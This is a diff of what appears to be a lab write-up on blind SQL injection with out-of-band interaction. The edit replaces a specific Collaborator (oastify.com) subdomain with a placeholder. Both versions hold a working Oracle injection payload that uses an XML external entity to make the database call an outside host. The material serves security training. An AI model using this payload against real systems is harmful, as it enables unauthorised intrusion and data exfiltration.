@@ -15,7 +15,7 @@ To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup 
 Final payload:
 
 ```
-Encoded: '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//xlmj5cg2qkopgynpdliohm4mzd54tzho.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+Encoded: '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//<id>.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 
-Decoded: ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xlmj5cg2qkopgynpdliohm4mzd54tzho.oastify.com/"> %remote;]>'),'/l') FROM dual--
+Decoded: ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<id>.oastify.com/"> %remote;]>'),'/l') FROM dual--
 ```
